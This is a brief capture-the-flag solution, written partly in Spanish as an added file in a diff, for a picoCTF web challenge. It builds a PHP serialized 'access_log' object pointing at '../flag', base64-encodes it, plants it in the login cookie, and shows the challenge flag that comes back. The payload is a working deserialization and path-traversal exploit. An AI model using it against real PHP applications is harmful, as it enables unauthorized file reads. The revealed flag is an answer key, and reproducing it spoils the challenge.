@@ -1,0 +1,9 @@
+echo -n "O:10:\"access_log\":1:{s:8:\"log_file\";s:7:\"../flag\";}" | base64 -w 0
+
+TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
+
+Establecer cookie: login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
+
+Acceder a http://wily-courier.picoctf.net:61131/authentication.php
+
+Deserialization error. picoCTF{1_c4nn0t_s33_y0u_2fba20fa}
